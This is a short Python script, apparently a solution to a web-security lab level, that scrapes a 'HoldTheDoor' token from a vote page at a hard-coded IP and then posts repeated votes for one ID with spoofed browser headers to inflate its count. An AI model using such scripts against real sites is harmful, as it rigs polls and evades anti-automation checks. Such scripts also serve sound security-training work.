#!/usr/bin/python3
import requests
from requests import cookies
from requests.sessions import default_headers


url = 'http://158.69.76.135/level2.php'
headwin = ("Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
header = {"User-Agent": headwin, "Referer": url}
ID = 2224
response = requests.get(url)
text = response.text.split()
try:
    txtId = text.index(str(ID))
except:
    txtId = 0
key = response.cookies['HoldTheDoor']
cookie = {'HoldTheDoor': key}
currentVote = 0
if (text[txtId+3]).isdigit():
    currentVote = int(text[txtId+3])

for x in range(currentVote, 29):
    sender = requests.post(url, {'id': ID, 'holdthedoor': 'submit', 'key': key}, cookies=cookie, headers=header)
    if sender.status_code is 200 and "Hold" in sender.text:
        print("ok", end="\r", flush=True)
    else:
        print("fail")

print("end of program")
